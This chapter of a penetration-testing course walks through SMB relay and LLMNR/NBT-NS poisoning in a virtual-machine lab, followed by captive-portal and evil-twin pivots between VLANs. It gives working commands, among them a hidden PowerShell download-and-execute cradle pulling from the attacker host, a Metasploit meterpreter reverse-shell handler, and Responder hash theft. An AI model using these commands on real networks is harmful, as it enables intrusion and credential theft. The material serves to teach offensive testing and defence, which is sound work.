# SMB Relays and LLMNR/NBT-NS Poisoning
© 2017 Gabriel Ryan All Rights Reserved

## Introduction
System administrators often use automated scripts to perform maintenance tasks on the network at regular intervals. These scripts frequently utilize service accounts with administrative privileges and employ NTLM for remote authentication, making them prime targets for both SMB Relay attacks and poisoning attacks. Ironically, many security-related hardware and software solutions, including antivirus programs and agentless network access control mechanisms, also authenticate in this manner.

This attack can be mitigated using a technique called SMB signing, where packets are digitally signed to confirm their authenticity and origin [16]. Most modern Windows operating systems support SMB signing, although it is enabled by default only on Domain Controllers [16].

The `impacket` toolkit includes a robust script for performing this type of attack. It is reliable, flexible, and supports attacks against NTLMv2.

## Performing an SMB Relay Attack Using `impacket`

### Prerequisites
Before starting, ensure that your Kali VM, Windows DC VM, and Windows AD Victim VM are running.

### Steps

1. **Obtain IP Addresses:**
   - On your Windows DC VM, open PowerShell and run:
     ```powershell
     PS C:\> ipconfig
     ```
   - Repeat the same command on your Windows AD Victim VM.
   - On your Kali VM, open a terminal and run:
     ```bash
     root@localhost~# ifconfig
     ```

2. **Start the `smbrelayx` Script:**
   - Navigate to `/opt/impacket/examples` on your Kali VM and start the `smbrelayx` script. Replace the IP addresses in the command below with the appropriate ones:
     ```bash
     root@localhost~# python smbrelayx.py -h <Windows_AD_Victim_IP> -c "powershell -nop -exec bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://<Kali_VM_IP>:8080')"
     ```

3. **Set Up Metasploit:**
   - Use the following commands within Metasploit to launch a server for the reverse shell. Replace `<Kali_VM_IP>` with the actual IP address of your Kali VM:
     ```bash
     msf > use exploit/multi/script/web_delivery
     msf (web_delivery) > set payload windows/meterpreter/reverse_tcp
     msf (web_delivery) > set TARGET 2
     msf (web_delivery) > set LHOST <Kali_VM_IP>
     msf (web_delivery) > set URIPATH /
     msf (web_delivery) > exploit
     ```

4. **Perform LLMNR/NBT-NS Poisoning:**
   - Launch `responder` on your Kali VM:
     ```bash
     root@localhost~# responder -I eth0 -wrf
     ```
   - Trigger an NTLM exchange on the Windows DC VM by attempting to access a non-existent SMB share:
     ```bash
     net use \\nonexistentserver\share /u:username password
     ```

5. **Observe the Attack:**
   - You should see three things happen on your Kali VM:
     1. `Responder` sends a poisoned answer to the Windows DC VM for the NetBIOS name of the non-existent server.
     2. `impacket` successfully executes an SMB Relay attack against the Windows AD Victim machine.
     3. Metasploit delivers a payload to the Windows AD Victim machine, providing you with a shell.

### Lab Exercise: SMB Relay Attacks
Practice using `impacket` to perform SMB Relay attacks against your Windows AD Victim VM and Windows DC VM. This time, perform the attack using the Empire PowerShell framework. Follow the steps outlined in the provided instructions:
- [Empire Framework Instructions](https://github.com/s0lst1c3/awae/blob/master/lab6/instructions.txt)

Note that SMB Relay attacks are ineffective against domain controllers due to the default SMB signing protection.

## Firewall and NAC Evasion Using Indirect Wireless Pivots

### Chapter Overview
In previous sections, we configured our Linux operating system to act as a wireless router, allowing us to bridge traffic between a rogue access point and an upstream network interface. In this section, we will learn a no-upstream attack that can be used to pivot from one segregated VLAN to another, bypassing firewall and NAC mechanisms.

### Configuring Linux as a Captive Portal
There are multiple ways to configure Linux to act as a captive portal. The most straightforward method is to run a DNS server that resolves all queries to the IP address of the rogue access point.

#### DHCP Configuration
Modify the DHCP configuration to specify the IP of the external wireless interface as the primary DNS server:
```bash
# define DHCP pool
dhcp-range=10.0.0.80,10.0.0.254,6h
# set phy as nameserver
dhcp-option=6,10.0.0.1
# set rogue AP as Gateway
dhcp-option=3,10.0.0.1 #Gateway
dhcp-authoritative
log-queries
```

#### DNS Spoofing
Use `dnsspoof` to resolve all DNS queries to the access point’s IP:
```bash
root@localhost~# echo '10.0.0.1' > dnsspoof.conf
root@localhost~# dnsspoof –i wlan0 -f ./dnsspoof.conf
```

#### Traffic Redirection
Redirect DNS and HTTP traffic to your server using `iptables`:
```bash
root@localhost~# iptables --table nat --append PREROUTING --protocol udp --destination-port 53 --jump REDIRECT --to-port 53
root@localhost~# iptables --table nat --append PREROUTING --protocol tcp --destination-port 80 --jump REDIRECT --to-port 80
root@localhost~# iptables --table nat --append PRERORTING --protocol tcp --destination-port 443 --jump REDIRECT --to-port 443
```

### Lab Exercise: Captive Portal
Use your Kali VM to run the bash script to create a captive portal. Connect to the captive portal using your Windows AD Victim virtual machine. Observe the terminal output from `dnsspoof` and how all traffic is redirected to an HTML page served by your Kali VM.

Additionally, follow the instructions to create a captive portal using EAPHammer:
- [EAPHammer Instructions](https://github.com/s0lst1c3/awae/blob/master/lab7/instructions.txt)

### Wireless Theory: Hostile Portal Attacks
Consider a scenario where you have breached a wireless network that provides access to sensitive internal resources. The sensitive resources are on a restricted VLAN, which is not accessible from the sandboxed VLAN where you are located. An authorized device is connected to the wireless network and is on the restricted VLAN.

You can combine several attacks to pivot into the restricted VLAN through the authorized device. First, force the authorized device to connect to you using an Evil Twin attack. Then, redirect all HTTP and DNS traffic to your wireless interface. Configure the portal's HTTP server to redirect all HTTP traffic to an SMB share on a non-existent server, causing the victim to resolve the SMB server's hostname using LLMNR or NBT-NS. This allows you to perform an LLMNR/NBT-NS poisoning attack, stealing the victim's NTLM hash, which can be cracked offline to obtain Active Directory credentials.

### Lab Exercise: Wireless Redirect to SMB with LLMNR/NBT-NS Poisoning
Create an open network using your wireless router and connect your Windows AD Victim virtual machine to it. Use `eaphammer` to launch the attack from your Kali VM:
```bash
root@localhost~# python eaphammer.py --interface wlan0 --essid FREE_WIFI -c 1 --auth peap --wpa 2 --hostile-portal
```

This will force the victim to connect to your access point, allowing you to pivot into the victim using an SMB Relay attack.

## Conclusion
You should now have a solid understanding of how to perform effective man-in-the-middle attacks without disrupting network resources. We also covered how to identify in-scope EAP networks and breach them using evil twin attacks, and demonstrated how to use wireless as a means of pivoting between segregated VLANs to bypass firewalls and NAC systems.

For additional reading, check out the resources included below. Spend some time thinking about how these attacks could be used against your organization’s network and what you could do to stop them.

## Resources
[1] "Airbase-ng [Aircrack-ng]," in aircrack-ng.org, 2010. [Online]. Available: https://www.aircrack-ng.org/doku.php?id=airbase-ng. Accessed: Feb. 24, 2017.
[2] P. Funk, S. Blake-Wilson, and rfcmarkup version 1, "Extensible authentication protocol tunneled transport layer security Authenticated protocol version 0 (EAP-TTLSv0)," 2008. [Online]. Available: https://tools.ietf.org/html/rfc5281. Accessed: Feb. 24, 2017.
[3] J. R. Vollbrecht, B. Aboba, L. J. Blunk, H. Levkowetz, J. Carlson, and rfcmarkup version 1, "Extensible authentication protocol (EAP)," 2004. [Online]. Available: https://tools.ietf.org/html/rfc3748. Accessed: Feb. 24, 2017.
[4] J. Wright and J. Cache, "Hacking exposed wireless," McGraw-Hill Education Group, 2015. [Online]. Available: http://dl.acm.org/citation.cfm?id=2825917. Accessed: Feb. 24, 2017.
[5] J. Wright and B. Antoniewicz, "PEAP: Pwnd Extensible Authentication Protocol," in ShmooCon, 2008.
[6] M. Marlinspike, "Moxie Marlinspike >> software >> sslstrip," in thoughtcrime.org, 2012. [Online]. Available: https://moxie.org/software/sslstrip/. Accessed: Feb. 24, 2017.
[7] Red Hat, Inc, "Chapter 17. iptables," in Red Hat Enterprise Linux 3: Reference Guide, 2003. [Online]. Available: https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/3/html/Reference_Guide/ch-iptables.html. Accessed: Feb. 24, 2017.
[8] "iptables(8) - Linux man page," in linux.die.net. [Online]. Available: https://linux.die.net/man/8/iptables. Accessed: Feb. 24, 2017.
[9] Mozilla Developer Network, "Strict-transport-security," in developer.mozilla.org, Mozilla Developer Network, 2016. [Online]. Available: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security. Accessed: Feb. 24, 2017.
[10] D. Keeler, "Preloading HSTS," Mozilla Security Blog, 2012. [Online]. Available: https://blog.mozilla.org/security/2012/11/01/preloading-hsts/. Accessed: Feb. 24, 2017.
[11] L. Nve Egea, "OFFENSIVE: Exploiting changes on DNS server configuration," in Blackhat Asia, 2014. [Online]. Available: https://www.blackhat.com/docs/asia-14/materials/Nve/Asia-14-Nve-Offensive-Exploiting-DNS-Servers-Changes.pdf. Accessed: Feb. 24, 2017.
[12] Protocol standard for a NetBIOS service on a TCP/UDP transport: Concepts and methods. NetBIOS Working Group in the Defense Advanced Research Projects Agency, Internet Activities Board, End-to-End Services Task Force. March 1987. (Format: TXT=158437 bytes) (Also STD0019) (Status: INTERNET STANDARD) (DOI: 10.17487/RFC1001)
[13] Protocol standard for a NetBIOS service on a TCP/UDP transport: Detailed specifications. NetBIOS Working Group in the Defense Advanced Research Projects Agency, Internet Activities Board, End-to-End Services Task Force. March 1987. (Format: TXT=170262 bytes) (Also STD0019) (Status: INTERNET STANDARD) (DOI:10.17487/RFC1002)
[14] L. Gaffié, "Laurent Gaffié," Trustwave, 2017. [Online]. Available: https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/. Accessed: Feb. 24, 2017.
[15] Microsoft, "Microsoft NTLM," 2017. [Online]. Available: https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx. Accessed: Feb. 24, 2017.
[16] J. Barreto, "The basics of SMB signing (covering both SMB1 and SMB2)," Jose Barreto’s Blog, 2010. [Online]. Available: https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/. Accessed: Feb. 24, 2017.
[17] "SPEAR: Redirect to SMB," 2015. [Online]. Available: https://www.cylance.com/redirect-to-smb. Accessed: Feb. 24, 2017.
[18] "Eduroam US - global Wi-Fi roaming for academia,". [Online]. Available: https://www.eduroam.us/node/10. Accessed: Feb. 24, 2017.
[19] M. Jahoda et al., "Red Hat Enterprise Linux 6.9 Beta Security Guide," 2016. [Online]. Available: https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html-single/Security_Guide/index.html#sect-Security_Guide-Firewalls-FORWARD_and_NAT_Rules. Accessed: Feb. 24, 2017.
[20] Microsoft, "Message Flow for Basic NTLM Authentication," in MSDN. [Online]. Available: https://msdn.microsoft.com/en-us/library/cc239684.aspx. Accessed: Feb. 24, 2017.
[21] "SMB relay: How we leverage it and how you can stop us," TAGI.WIKI, 2015. [Online]. Available: http://www.tagi.wiki/advisories/smb-relay-how-we-leverage-it-and-how-you-can-stop-us. Accessed: Feb. 24, 2017.
[22] S. Chaudhary, "Evil twin Tutorial," Kali Linux Hacking Tutorials, 2014. [Online]. Available: http://www.kalitutorials.net/2014/07/evil-twin-tutorial.html. Accessed: Feb. 24, 2017.